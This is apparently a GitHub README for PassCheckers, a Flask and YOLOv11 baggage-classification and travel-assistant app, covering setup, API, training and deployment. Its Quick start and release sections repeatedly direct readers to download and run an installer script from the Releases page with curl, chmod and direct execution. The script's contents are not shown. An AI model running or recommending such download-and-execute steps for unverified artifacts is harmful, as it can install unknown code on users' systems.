https://github.com/ragnorforever/PassCheckers/releases

# PassCheckers: AI Baggage Classifier and Travel Assistant

[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/ragnorforever/PassCheckers/releases) [![Flask](https://img.shields.io/badge/Flask-%23000?style=flat&logo=flask&logoColor=white)](https://flask.palletsprojects.com/) [![PyTorch](https://img.shields.io/badge/PyTorch-%23EE4C2C?style=flat&logo=pytorch&logoColor=white)](https://pytorch.org/) [![Nuxt](https://img.shields.io/badge/Nuxt-%2300DC82?style=flat&logo=nuxtdotjs&logoColor=white)](https://nuxtjs.org/) [![MySQL](https://img.shields.io/badge/MySQL-%230077B8?style=flat&logo=mysql&logoColor=white)](https://www.mysql.com/) [![Redis](https://img.shields.io/badge/Redis-%23DC382D?style=flat&logo=redis&logoColor=white)](https://redis.io/) [![TensorRT](https://img.shields.io/badge/TensorRT-%23007ACC?style=flat&logo=nvidia&logoColor=white)](https://developer.nvidia.com/tensorrt)  

![Carry-on luggage classification](https://images.unsplash.com/photo-1520975698516-4f4b8b5b72b9?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=9f2c6d5a0c7b6e3d8f2b5f1e7a7c2b91)

AI 이미지 분석 기반 수하물 분류 및 여행 도우미 애플리케이션.
PassCheckers는 수하물과 소지품을 실시간으로 분석해 분류, 규정 위반 탐지, 포장 가이드, 여행 체크리스트 통합을 제공합니다.

Table of contents
- Features
- Tech stack
- Architecture
- Quick start (Releases)
- Local install
- Docker / GPU deploy
- Model management
- API & Web UI
- Data format & Annotation
- Training and optimization
- Performance & profiling
- Troubleshooting
- Contributing
- License

Features
- Image-based baggage detection and classification using YOLOv11 model.
- Object-level tags: electronics, liquids, sharp objects, clothing, medication, documents.
- Violation flags for airline carry-on rules and local customs.
- Packing assistant with suggested item grouping and checklist export.
- Web UI built with Nuxt + Vue for travel and inspection workflows.
- REST API served by Flask for integrations and automation.
- Fast inference via TensorRT on NVIDIA GPUs.
- Persistent session store using Redis; user data in MySQL.
- CLI tools for batch inference, dataset conversion, and evaluation.

Tech stack
- Backend: Flask, Python, PyTorch, TensorRT
- Frontend: Nuxt, Vue.js
- Datastore: MySQL (metadata), Redis (sessions, queue)
- Model: YOLOv11 (detection + classification head)
- Infrastructure: Docker, docker-compose, optional Kubernetes manifests
- CI/CD: GitHub Actions for tests and release builds
- Topics: flask, image-classification, mysql, nuxt, python, pytorch, redis, tensorrt, vuejs, yolov11

Architecture
- Edge / Camera
  - Capture images or stream video.
  - Forward frames to inference service or run edge container.
- Inference service (Flask + PyTorch/TensorRT)
  - Accept images via REST and WebSocket.
  - Run YOLOv11 model for detection and classification.
  - Produce bounding boxes, class labels, confidence, and rule flags.
  - Store results in MySQL; cache session info in Redis.
- Web client (Nuxt / Vue)
  - Visualize detections.
  - Offer packing tips and checklist based on detected items.
  - Allow manual tagging and upload to dataset.
- Admin & Training
  - CLI and web tools to curate annotations and trigger training.
  - Export datasets in COCO / YOLO formats.

Quick start (Releases)
- Download the latest release package from the Releases page:
  https://github.com/ragnorforever/PassCheckers/releases
- The releases page contains packaged artifacts. Download the installer or tarball and execute the included script.
- Example:
  - Download passcheckers-v1.0.0-linux.tar.gz
  - Unpack and run:
    - tar xzf passcheckers-v1.0.0-linux.tar.gz
    - cd passcheckers-v1.0.0
    - bash ./install.sh
  - Or run the installer directly:
    - curl -L -o passcheckers-installer.sh "https://github.com/ragnorforever/PassCheckers/releases/download/v1.0.0/passcheckers-installer.sh"
    - chmod +x passcheckers-installer.sh
    - ./passcheckers-installer.sh --target /opt/passcheckers
- The installer will set up a conda or venv environment, pull model artifacts, and create a docker-compose file for local launch.

Local install (development)
- System requirements
  - Linux x86_64 or WSL2
  - Python 3.9+
  - NVIDIA GPU with CUDA 11.x for TensorRT builds (optional)
  - Docker for containerized workflows
- Clone
  - git clone https://github.com/ragnorforever/PassCheckers.git
  - cd PassCheckers
- Create virtual environment
  - python -m venv .venv
  - source .venv/bin/activate
  - pip install -r requirements.txt
- Database
  - Create MySQL database passcheckers
  - Run migrations: python manage.py migrate
- Redis
  - Start local Redis and set REDIS_URL in .env
- Start backend
  - FLASK_ENV=development flask run --host=0.0.0.0 --port=5000
- Start frontend
  - cd web
  - npm install
  - npm run dev

Docker / GPU deploy
- We provide docker-compose for local setups and a production compose for GPU nodes.
- Example GPU compose (excerpt):
  - version: '3.8'
  - services:
    - backend:
      - image: passcheckers/backend:latest
      - deploy: resources: reservations: devices: - capabilities: [gpu]
- Build and start:
  - docker-compose -f docker-compose.gpu.yml up --build --remove-orphans
- Use NVIDIA Container Toolkit for GPU passthrough.
- For Kubernetes, see k8s/ folder for deployment and service manifests.

Model management
- Model formats
  - PyTorch (.pt) for training and CPU/GPU inference.
  - ONNX for standardization.
  - TensorRT engine (.plan) for optimized inference on NVIDIA GPUs.
- Model versions
  - We tag model artifacts per release. See Releases page for prebuilt engines and weights.
- Convert to TensorRT
  - python tools/convert_to_onnx.py --weights yolov11.pt --out yolov11.onnx
  - python tools/onnx_to_tensorrt.py --onnx yolov11.onnx --out yolov11.plan
- Load runtime
  - The backend loads a runtime based on config:
    - MODELS_RUNTIME=tensorrt or pytorch
- Model swap
  - Place new model in models/ and update models.json to register version.

API & Web UI
- Core endpoints (examples)
  - POST /api/v1/infer
    - payload: image file (multipart/form)
    - response: detections array {class, score, bbox, flags}
  - GET /api/v1/models
    - list available models and versions
  - POST /api/v1/annotate
    - payload: annotation JSON for dataset curation
- Authentication
  - JWT-based auth with user roles: admin, inspector, traveler.
  - Admins can upload models and manage dataset.
- Web client
  - Live stream view with overlayed detections.
  - Checklist generator based on detected items.
  - Batch upload and review queue.

Data format & Annotation
- Use COCO-style JSON for evaluation and dataset sharing.
- Supported annotation tools
  - LabelImg, CVAT, Roboflow exports.
- Required fields
  - image_id, file_name, width, height
  - annotations: bbox [x,y,w,h], category_id, attributes (fragile, liquid)
- Export utilities
  - python tools/convert_labels.py --src cvat --dst coco --out data/train.json

Training and optimization
- Training configuration
  - models/configs/yolov11.yaml defines architecture and hyperparameters.
- Run training
  - python train.py --config models/configs/yolov11.yaml --data data/dataset.yaml --epochs 50 --batch 16
- Mixed precision
  - Use AMP in PyTorch to reduce memory and speed training on GPUs.
- Pruning & quantization
  - We include scripts for post-training quantization to int8 for TensorRT engines.
  - python tools/quantize.py --model yolov11.pt --out yolov11_int8.plan
- Validation
  - python eval.py --weights yolov11.pt --data data/val.yaml --save-json

Performance & profiling
- Measure FPS and latency
  - python tools/benchmark.py --engine yolov11.plan --input data/sample.jpg --repeat 100
- Redis queue
  - Use Redis to buffer inference jobs and scale worker replicas.
- Tips
  - Use batch inference for throughput.
  - Use TensorRT engine tuned to target GPU for lowest latency.

Troubleshooting
- Backend fails to start
  - Check .env for DB and Redis URLs.
- Model load errors
  - Verify model path in config and engine format (pt, onnx, plan).
- Low accuracy on custom items
  - Collect more labeled samples and retrain with augmentation.
- GPU not used
  - Ensure nvidia-docker and container toolkit are installed.

Contributing
- Workflow
  - Fork, create a feature branch, and open a pull request.
  - Follow commit style: feat, fix, docs, chore.
- Tests
  - pytest runs unit tests.
  - Run linting: flake8 and black formatting.
- Code of conduct
  - Respectful behavior and clear discussion.

Security
- Keep secrets in environment variables or a secrets manager.
- Rotate API keys and database credentials.
- Use HTTPS in production and limit access to admin endpoints.

Release artifacts and installers
- Visit the Releases page to get packaged builds, model weights, and installer scripts:
  - https://github.com/ragnorforever/PassCheckers/releases
- Each release may contain:
  - passcheckers-installer.sh — Linux installer script
  - passcheckers-windows.zip — Windows build
  - yolov11-vX.Y.pt — PyTorch weights
  - yolov11-vX.Y.plan — TensorRT engine
- Download the artifact that matches your platform and run the included installer as documented in the release notes.

Examples and use cases
- Airport security
  - Run live inspection at checkpoints to flag prohibited items.
- Hotel check-in
  - Offer packing suggestions and reminders for travelers.
- Cruise terminals
  - Detect large or dangerous items during boarding.
- Personal travel app
  - Scan packed bag and generate a checklist and warnings.

Files and directories
- /backend — Flask app, model loaders, API
- /web — Nuxt / Vue client
- /models — prebuilt weights and engines (large files are in Releases)
- /data — example datasets and annotations
- /tools — conversion, benchmarking, and training helpers
- /docker — docker-compose and Dockerfiles
- /k8s — Kubernetes manifests

Credits and acknowledgements
- YOLOv11 (model backbone adaptation)
- PyTorch community for tooling
- Nuxt and Vue for the frontend
- Test images from Unsplash and public datasets used for prototyping

License
- MIT License. See LICENSE file.

Contact
- Report issues via GitHub Issues.
- For large contributions or partnerships, open a discussion on the repository.